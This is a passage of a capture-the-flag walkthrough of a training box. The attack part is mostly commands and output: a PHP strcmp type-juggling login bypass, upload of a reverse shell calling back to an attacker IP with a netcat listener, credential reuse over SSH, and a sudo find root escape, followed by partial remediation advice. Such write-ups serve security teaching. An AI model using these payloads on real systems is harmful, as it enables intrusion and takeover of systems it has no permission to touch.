+<p>We never need to know the real credentials to bypass the login. The credentials in <code>config.php</code> become valuable <em>later</em>, for a different reason (password reuse).</p>
+</div>
+<hr />
+<h2 id="4-initial-foothold-user-access">4. Initial Foothold (User Access)<a class="headerlink" href="#4-initial-foothold-user-access" title="Permanent link">&para;</a></h2>
+<h3 id="41-crafting-the-authentication-bypass-request">4.1 Crafting the Authentication Bypass Request<a class="headerlink" href="#41-crafting-the-authentication-bypass-request" title="Permanent link">&para;</a></h3>
+<p>Browse to <code>http://$IP/login/login.php</code>, submit <strong>any</strong> dummy values (e.g., <code>vcxvc</code> / <code>xxx</code>) with the intercept <strong>on</strong> in Burp, so the POST is caught before it leaves the browser. Then rewrite the body to submit both fields as arrays:</p>
+<p><img alt="assets/06-burp-auth-bypass.png" src="assets/06-burp-auth-bypass.png" />
+<em>Burp Proxy Intercept holding the POST to /login/login.php with the array payload in the body</em></p>
+<p>The full request:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nf">POST</span> <span class="nn">/login/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">10.129.50.24</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=fjc361aqmmborctns81ts5eaom</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="err">...</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nt">username[]</span><span class="o">=</span><span class="s">bvc</span><span class="p">&amp;</span><span class="nt">password[]</span><span class="o">=</span><span class="s">cvb</span>
+</code></pre></div>
+<p><strong>Parameter-by-parameter:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+<th>Effect server-side</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>username[]</code></td>
+<td><code>bvc</code></td>
+<td>PHP parses this as <code>$_POST['username'] = ['bvc']</code>. Passes <code>!empty()</code> (non-empty arrays are truthy-ish for <code>empty()</code>). <code>strcmp()</code> then chokes → returns <code>NULL</code>.</td>
+</tr>
+<tr>
+<td><code>password[]</code></td>
+<td><code>cvb</code></td>
+<td>Same trick. Second <code>strcmp()</code> also returns <code>NULL</code>.</td>
+</tr>
+<tr>
+<td>(values)</td>
+<td>arbitrary</td>
+<td>The content is irrelevant — only the <strong>type</strong> matters. <code>bvc</code>/<code>cvb</code> were just keyboard mash.</td>
+</tr>
+</tbody>
+</table>
+<p>Both guards collapse: <code>NULL == 0</code> → <code>true</code>, <code>NULL == 0</code> → <code>true</code>. The server responds <strong><code>302 Found</code></strong> with <code>Location: /upload.php</code> and sets the session as authenticated. Forward the request (or just browse — the session cookie now carries <code>user_id = 1</code>).</p>
+<p><img alt="assets/07-admin-upload-panel.png" src="assets/07-admin-upload-panel.png" />
+<em>Admin File Uploads panel — authenticated area reached via the bypass</em></p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>The same bypass works without a browser:
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://<span class="nv">$IP</span>/login/login.php<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">     </span>-d<span class="w"> </span><span class="s1">'username[]=bvc&amp;password[]=cvb'</span>
+</code></pre></div>
+Expect <code>HTTP/1.1 302 Found</code> and <code>Location: /upload.php</code>. Reuse <code>cookies.txt</code> with <code>-b cookies.txt</code> on <code>/upload.php</code>.</p>
+</div>
+<h3 id="42-from-admin-panel-to-rce-unrestricted-file-upload">4.2 From Admin Panel to RCE — Unrestricted File Upload<a class="headerlink" href="#42-from-admin-panel-to-rce-unrestricted-file-upload" title="Permanent link">&para;</a></h3>
+<p>The panel is a plain file uploader ("Upload Your Files To Base Server"). Reviewing the site source and the upload form reveals <strong>no client-side extension filter</strong>, and testing shows the server performs <strong>no validation whatsoever</strong> — <code>.php</code> files are accepted. An uploader that stores attacker-controlled PHP inside the web root and lets Apache execute it is a direct remote code execution primitive.</p>
+<p><strong>Plan:</strong> upload a PHP reverse shell, find where it lands, trigger it, catch it.</p>
+<p>Prepare a standard pentestmonkey reverse shell (<code>/usr/share/webshells/php/php-reverse-shell.php</code> on Kali) with the attack-box tunnel IP and a port:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>cp<span class="w"> </span>/usr/share/webshells/php/php-reverse-shell.php<span class="w"> </span>shell.php
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="c1"># edit $ip / $port inside the file:</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="c1">#   $ip = '10.10.16.201';   // your VPN/tun0 IP</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1">#   $port = 8000;</span>
+</code></pre></div>
+<p>Upload it:</p>
+<p><img alt="assets/08-upload-success.png" src="assets/08-upload-success.png" />
+<em>Green toast confirming "Your file has been uploaded successfully!"</em></p>
+<h3 id="43-locating-the-upload-directory">4.3 Locating the Upload Directory<a class="headerlink" href="#43-locating-the-upload-directory" title="Permanent link">&para;</a></h3>
+<p>The uploader does <strong>not</strong> tell us where files are stored. Since uploads almost always land in a subdirectory of the web root, fuzz for it — this time with a bigger wordlist (<code>dirb/big.txt</code>, ~20k entries):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ffuf<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/big.txt:FUZZ<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">     </span>-u<span class="w"> </span>http://<span class="nv">$IP</span>/FUZZ<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">     </span>-t<span class="w"> </span><span class="m">100</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">     </span>-mc<span class="w"> </span>all<span class="w"> </span>-fc<span class="w"> </span><span class="m">404</span>
+</code></pre></div>
+<p>A few wordlists in, <code>big.txt</code> hits paydirt:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>_uploaded               [Status: 200, Size: 509, Words: 25, Lines: 12]
+</code></pre></div>
+<p>Browsing to <code>http://$IP/_uploaded/</code> (directory listing enabled again) confirms <code>shell.php</code> is sitting there:</p>
+<p><img alt="assets/10-uploaded-directory.png" src="assets/10-uploaded-directory.png" />
+<em>Index of /_uploaded showing our uploaded shell.php</em></p>
+<h3 id="44-catching-the-shell">4.4 Catching the Shell<a class="headerlink" href="#44-catching-the-shell" title="Permanent link">&para;</a></h3>
+<p>Start the listener, then trigger the payload by requesting the file (a click in the browser works too):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-l</code></td>
+<td>Listen mode (server, not client).</td>
+</tr>
+<tr>
+<td><code>-v</code></td>
+<td>Verbose — report connections.</td>
+</tr>
+<tr>
+<td><code>-n</code></td>
+<td>Numeric-only output — skip DNS resolution (faster, cleaner logs).</td>
+</tr>
+<tr>
+<td><code>-p 8000</code></td>
+<td>Port to bind (must match <code>$port</code> in the shell).</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>http://<span class="nv">$IP</span>/_uploaded/shell.php
+</code></pre></div>
+<p><img alt="assets/11-reverse-shell.png" src="assets/11-reverse-shell.png" />
+<em>Netcat listener catching the reverse shell as www-data on the base host</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>connect to [10.10.16.201] from (UNKNOWN) [10.129.50.24] 41354
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Linux base 4.15.0-151-generic #157-Ubuntu SMP ... x86_64 GNU/Linux
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>sh: 0: can't access tty; job control turned off
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>$ whoami
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>www-data
+</code></pre></div>
+<p><strong>Foothold confirmed:</strong> code execution as <code>www-data</code> (the Apache service account — least privilege, as expected for a PHP RCE).</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p><code>sh: 0: can't access tty; job control turned off</code> means this is a dumb, non-interactive shell: no tab completion, no <code>Ctrl+C</code> safety (it kills the shell), broken editors. Stabilize before doing real work.</p>
+</div>
+<h3 id="45-shell-upgrade-full-tty">4.5 Shell Upgrade — Full TTY<a class="headerlink" href="#45-shell-upgrade-full-tty" title="Permanent link">&para;</a></h3>
+<p><strong>Step 1 — spawn a bash via Python pty:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div>
+<p><strong>Step 2 — background the shell</strong> with <code>Ctrl+Z</code>, then on the <strong>attacker</strong> box put your own terminal into raw mode and foreground the shell again:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># press Ctrl+Z first, then:</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Piece</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>stty raw</code></td>
+<td>Disables line-buffering/interpretation of special chars in <em>your</em> terminal so keystrokes pass through verbatim to the remote shell (enables <code>Ctrl+C</code>, arrows, autocomplete).</td>
+</tr>
+<tr>
+<td><code>-echo</code></td>
+<td>Stops your terminal from double-printing every character.</td>
+</tr>
+<tr>
+<td><code>fg</code></td>
+<td>Brings <code>nc</code> back to the foreground — the shell resumes mid-session.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Step 3 — environment fixes inside the shell:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm<span class="w">        </span><span class="c1"># makes clear, vim, top render correctly</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>stty<span class="w"> </span>rows<span class="w"> </span><span class="m">40</span><span class="w"> </span>cols<span class="w"> </span><span class="m">140</span><span class="w">    </span><span class="c1"># match your local terminal size (check with `stty size` before Ctrl+Z)</span>
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Alternative one-liner if Python is present: <code>script /dev/null -c bash</code> — then apply the same <code>stty raw -echo; fg</code> dance on the attacker side.</p>
+</div>
+<h3 id="46-enumeration-as-www-data-credential-discovery">4.6 Enumeration as www-data &amp; Credential Discovery<a class="headerlink" href="#46-enumeration-as-www-data-credential-discovery" title="Permanent link">&para;</a></h3>
+<p>Standard low-privilege enumeration on the web root pays off:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>www-data@base:/var/www/html$<span class="w"> </span>ls<span class="w"> </span>-al
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>total<span class="w"> </span><span class="m">72</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>drwxr-xr-x<span class="w"> </span><span class="m">6</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">9</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>.
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>drwxr-xr-x<span class="w"> </span><span class="m">3</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>..
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>drwxrwxr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>www-data<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">15</span>:39<span class="w"> </span>_uploaded
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>drwxr-xr-x<span class="w"> </span><span class="m">7</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>assets
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>forms
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">     </span><span class="m">39344</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>index.html
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">15</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>login
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">       </span><span class="m">128</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">4</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>logout.php
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">      </span><span class="m">2952</span><span class="w"> </span>Jun<span class="w">  </span><span class="m">9</span><span class="w">  </span><span class="m">2022</span><span class="w"> </span>upload.php
+</code></pre></div>
+<p>The <code>login/</code> directory is readable by <code>www-data</code> (it has to be — Apache serves it). Inside is the <code>config.php</code> we spotted during recon:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>www-data@base:/var/www/html$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>login
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>www-data@base:/var/www/html/login$<span class="w"> </span>ls
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>config.php<span class="w">  </span>login.php<span class="w">  </span>login.php.swp
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>www-data@base:/var/www/html/login$<span class="w"> </span>cat<span class="w"> </span>config.php
+</code></pre></div>
+<p><img alt="assets/12-config-credentials.png" src="assets/12-config-credentials.png" />
+<em>cat config.php revealing plaintext credentials admin / thisisagoodpassword</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nv">$username</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nv">$password</span> <span class="o">=</span> <span class="s2">"thisisagoodpassword"</span><span class="p">;</span>
+</code></pre></div>
+<p>Now we have <strong>plaintext credentials</strong>. SSH (port 22 from recon) gives a far more stable session than the webshell — and credential <strong>reuse</strong> across services is rampant. Try the password against local users. The box has a user <code>john</code> (visible in <code>/home/</code>):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>ssh<span class="w"> </span>john@<span class="nv">$IP</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="c1"># password: thisisagoodpassword</span>
+</code></pre></div>
+<p><img alt="assets/13-ssh-john-user-flag.png" src="assets/13-ssh-john-user-flag.png" />
+<em>SSH login as john succeeded — Ubuntu 18.04.6 MOTD and user.txt contents</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>john@base:~$ ls
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>user.txt
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>john@base:~$ cat user.txt
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>54846c258f3b4612f78a819573d158e
+</code></pre></div>
+<blockquote>
+<p><strong>Flag captured — <code>user.txt</code>:</strong> <code>54846c258f3b4612f78a819573d158e</code> <em>(leading character is cropped in the screenshot; hashes are per-machine and for progress verification only — never submit one you didn't read yourself).</em></p>
+</blockquote>
+<p><strong>Foothold complete.</strong> The web-exposed PHP flaw got us <code>www-data</code>; plaintext config credentials plus password reuse got us a real user account.</p>
+<hr />
+<h2 id="5-privilege-escalation-root-access">5. Privilege Escalation (Root Access)<a class="headerlink" href="#5-privilege-escalation-root-access" title="Permanent link">&para;</a></h2>
+<h3 id="51-systematic-enumeration">5.1 Systematic Enumeration<a class="headerlink" href="#51-systematic-enumeration" title="Permanent link">&para;</a></h3>
+<p>Work the classic checklist before reaching for automated scripts:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># 1. Sudo rights — the highest-value check on any box</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>sudo<span class="w"> </span>-l
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># 2. SUID/SGID binaries</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="c1"># 3. Scheduled jobs</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron*
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>
+<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="c1"># 4. Internal services / listening ports</span>
+<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>ss<span class="w"> </span>-tlnp
+<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="c1"># (or) netstat -tlnp</span>
+<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>
+<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="c1"># 5. Writable files &amp; dirs of interest</span>
+<a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span>proc
+<a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>
+<a id="__codelineno-26-18" name="__codelineno-26-18" href="#__codelineno-26-18"></a><span class="c1"># 6. Kernel / OS</span>
+<a id="__codelineno-26-19" name="__codelineno-26-19" href="#__codelineno-26-19"></a>uname<span class="w"> </span>-a<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/etc/os-release
+</code></pre></div>
+<h3 id="52-the-vector-sudo-on-usrbinfind">5.2 The Vector: <code>sudo</code> on <code>/usr/bin/find</code><a class="headerlink" href="#52-the-vector-sudo-on-usrbinfind" title="Permanent link">&para;</a></h3>
+<p><code>sudo -l</code> (supplying john's password at the prompt) reveals a catastrophically broad rule:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>User john may run the following commands on base:
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>    (root : root) /usr/bin/find
+</code></pre></div>
+<p>Reading the sudoers entry: user <strong>john</strong> may run <strong><code>/usr/bin/find</code></strong> as <strong>user root, group root</strong> — with <strong>any arguments</strong>, on <strong>any host</strong>.</p>
+<p><code>find</code> should never be in a sudoers file. It is a <em>program executor by design</em> — its <code>-exec</code>/<code>-execdir</code> predicates run arbitrary commands for every path they visit. Sudoing <code>find</code> therefore means <em>sudoing any command you embed in it</em>.</p>
+<p>Cross-reference on <a href="https://gtfobins.github.io/gtfobins/find/">GTFOBins</a> (<code>find</code> → Shell → Sudo section):</p>
+<p><img alt="assets/14-gtfobins-find.png" src="assets/14-gtfobins-find.png" />
+<em>GTFOBins entry for find — Sudo section with the shell payload</em></p>
+<h3 id="53-exploitation">5.3 Exploitation<a class="headerlink" href="#53-exploitation" title="Permanent link">&para;</a></h3>
+<p>From john's home directory:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sudo<span class="w"> </span>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/sh<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
+</code></pre></div>
+<p><strong>Payload breakdown:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo</code></td>
+<td>Run as root, per the sudoers rule — password prompt accepts john's password.</td>
+</tr>
+<tr>
+<td><code>find .</code></td>
+<td>Search from the current directory; harmless on its own.</td>
+</tr>
+<tr>
+<td><code>-exec /bin/sh \;</code></td>
+<td>For each match, execute <code>/bin/sh</code> <strong>in place of find's normal output</strong>. Because sudo elevates <code>find</code> itself, every child process — including this shell — inherits <strong>root</strong>. <code>\;</code> terminates the <code>-exec</code> expression.</td>
+</tr>
+<tr>
+<td><code>-quit</code></td>
+<td>Stop after the first match, so exactly one root shell spawns and <code>find</code> exits cleanly (avoids spawning a shell per file).</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="assets/15-root-shell.png" src="assets/15-root-shell.png" />
+<em>sudo find -exec spawning a root shell and reading root.txt</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a># id
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>uid=0(root) gid=0(root) groups=0(root)
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a># cat /root/root.txt
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>51709519ea18ab37dd6fc58096bea949
+</code></pre></div>
+<p><strong>Root achieved.</strong> <code>uid=0(root)</code> — the <code>#</code> prompt confirms the superuser shell.</p>
+<blockquote>
+<p><strong>Flag captured — <code>root.txt</code>:</strong> <code>51709519ea18ab37dd6fc58096bea949</code></p>
+</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The general lesson: <strong>any</strong> interpreter, editor, pager or archiver in sudoers is usually a root escape (<code>vim</code>, <code>less</code>, <code>awk</code>, <code>tar</code>, <code>python</code>, <code>cp</code>, ...). Before accepting a sudoers entry as "safe", check it against GTFOBins. Same applies to SUID bits on such binaries — the GTFOBins SUID section applies identically.</p>
+</div>
+<hr />
+<h2 id="6-remediation-security-hardening">6. Remediation &amp; Security Hardening<a class="headerlink" href="#6-remediation-security-hardening" title="Permanent link">&para;</a></h2>
+<p>Map each fix to the exact weakness that made it exploitable:</p>
+<h3 id="61-sensitive-file-exposure-loginphpswp-directory-listing">6.1 Sensitive File Exposure (<code>login.php.swp</code>, directory listing)<a class="headerlink" href="#61-sensitive-file-exposure-loginphpswp-directory-listing" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Purge editor artifacts from deployments.</strong> Add <code>.swp</code>, <code>.swo</code>, <code>*~</code>, <code>.bak</code>, <code>.old</code> to <code>.gitignore</code> and to the CI/CD "forbidden in webroot" scan. Configure vim to keep swap files outside served roots: <code>set directory^=$HOME/.vim/swap//</code> in <code>~/.vimrc</code>.</li>
+<li><strong>Disable directory listings</strong> in Apache wherever an index file is expected:
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nt">&lt;Directory</span><span class="w"> </span><span class="s">/var/www/html</span><span class="nt">&gt;</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="w">    </span><span class="nb">Options</span><span class="w"> </span>-Indexes
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="nt">&lt;/Directory&gt;</span>
+</code></pre></div></li>
+<li><strong>Deny-dotfile/artifact access</strong> as defense in depth:
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="nt">&lt;FilesMatch</span><span class="w"> </span><span class="s">"\.(swp|swo|bak|old|save|ini|log)$"</span><span class="nt">&gt;</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="w">    </span><span class="nb">Require</span><span class="w"> </span><span class="k">all</span><span class="w"> </span>denied
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nt">&lt;/FilesMatch&gt;</span>
+</code></pre></div></li>
+</ul>
+<h3 id="62-authentication-bypass-php-type-juggling">6.2 Authentication Bypass (PHP type juggling)<a class="headerlink" href="#62-authentication-bypass-php-type-juggling" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Never use <code>strcmp()</code> for secrets.</strong> Store only salted <strong>hashes</strong> (<code>password_hash()</code> / Argon2id) and verify with <code>password_verify()</code> — which is constant-time and type-safe.</li>
+<li>If string comparison against a secret is truly required, use <strong><code>hash_equals()</code></strong> (timing-safe) and it naturally rejects non-string input.</li>
+<li><strong>Validate input types before use</strong> — reject anything that is not a string:
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="x">if (!is_string($_POST['username']) || !is_string($_POST['password'])) {</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="x">    http_response_code(400);</span>
